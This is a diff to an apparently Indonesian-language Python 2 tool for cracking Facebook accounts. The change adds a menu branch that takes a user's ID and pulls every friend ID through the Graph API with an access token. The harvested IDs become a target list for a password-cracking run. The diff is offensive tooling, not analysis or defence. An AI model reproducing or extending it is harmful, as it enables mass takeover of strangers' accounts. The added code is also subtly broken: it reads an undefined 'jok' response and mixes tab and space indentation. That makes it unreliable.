@@ -544,9 +544,8 @@ def super():
     print '\x1b[1;37;40m1. Crack dari daftar Teman'
     print '\x1b[1;37;40m2. Crack dari member Grup'
     print '\x1b[1;37;40m3. Crack dari teman dari teman'
-    print '
-print '\x1b[1;31;40m0. Kembali'
-pilih_super()
+    print '\x1b[1;31;40m0. Kembali'
+    pilih_super()
 
 
 def pilih_super():
@@ -586,11 +585,31 @@ def pilih_super():
                     id.append(i['id'])
 
             else:
-                if peak == '0':
-                    menu_hack()
-                else:
-                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
-                    pilih_super()
+				if peak == '2':
+					os.system('reset')
+					print logo
+					idt = raw_input('\x1b[1;91m[+] \x1b[1;92mInput ID friend \x1b[1;91m: \x1b[1;97m')
+					try:
+						r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+						asw = json.loads(jok.text)
+						print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mFrom\x1b[1;91m :\x1b[1;97m ' + asw['name']
+					except KeyError:
+						print '\x1b[1;91m[!] Friend not found'
+						raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
+						super()
+
+					jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mGet all id from friend \x1b[1;97m...')
+					r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+					z = json.loads(r.text)
+					for i in z['data']:
+						id.append(i['id'])
+
+				else:
+					if peak == '0':
+						menu_hack()
+					else:
+						print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mTidak ada'
+						pilih_super()
     print '\x1b[1;91m[+] \x1b[1;92mJumlah ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
     jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
     titik = ['.   ', '..  ', '... ']
